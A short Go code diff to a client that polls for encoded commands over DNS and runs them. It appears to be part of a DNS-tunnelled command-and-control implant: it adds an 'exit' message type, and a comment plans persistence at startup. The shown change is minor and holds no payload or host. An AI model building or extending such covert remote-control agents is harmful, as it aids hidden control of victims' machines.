@@ -18,6 +18,7 @@ const (
 	POLL   messageType = "poll"
 	ANSWER messageType = "answer"
 	ERROR  messageType = "error"
+	EXIT   messageType = "exit"
 )
 
 type DNSClient struct {
@@ -73,6 +74,7 @@ func (d DNSClient) handleAnswer(answerMsg *dns.Msg) {
 	d.handleDecodedCommand(decoded)
 }
 
+// todo: exit not working correctly
 // todo: add persistent startup command
 func (d DNSClient) handleDecodedCommand(decoded string) {
 	switch decoded {
@@ -83,7 +85,7 @@ func (d DNSClient) handleDecodedCommand(decoded string) {
 		d.idleCounter = 0
 		break
 	case "exit":
-		d.sendMessage(ANSWER, "exit")
+		d.sendMessage(EXIT, "exit")
 		os.Exit(0)
 	default:
 		d.idleCounter = 0
